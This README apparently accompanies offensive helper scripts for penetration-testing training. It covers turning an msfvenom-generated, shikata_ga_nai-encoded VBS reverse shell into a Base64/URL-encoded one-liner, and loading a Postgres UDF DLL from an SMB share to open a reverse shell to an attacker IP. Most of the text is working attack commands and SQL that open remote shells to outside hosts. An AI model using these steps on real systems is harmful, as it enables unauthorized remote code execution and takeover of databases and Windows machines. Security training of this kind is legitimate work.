# Auxiliar scripts

## vbs_oneliner.py
Creates a oneliner of a VBS script. Also prints a Base64 + URL encoded string of it.

You can create a revershe shell in VBS with:
```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.133.120 LPORT=80 -e x86/shikata_ga_nai -f vbs -o rev.vbs
```
Then, use the script
```bash
python3 vbs_oneliner.py rev.vbs
```
Then, you will have `rev_oneliner.vbs` and the Base64 + URL Encoded string as the output.

## postgresUDFrevShell
Postgres UDF dll to obtain a reverse shell.
1. Compile with Visual Studio Code: `Build -> Build Solution`
2. Rename the DLL to "`rev_shell.dll`": `mv awae.dll rev_shell.dll`
3. Create an smb server `impacket-smbserver -smb2support -debug awae .`
4. Use the following SQL to create the function `CREATE OR REPLACE FUNCTION rev_shell(text,integer) RETURNS void AS $$\\\\192.168.45.219\\awae\\rev_shell.dll$$, $$connect_back$$ language c strict`
5. Finally, call the function `select rev_shell($$192.168.45.219$$, 4444)`

> [!NOTE]
> If you need to delete your function, just run `DROP FUNCTION rev_shell(text, integer);` 
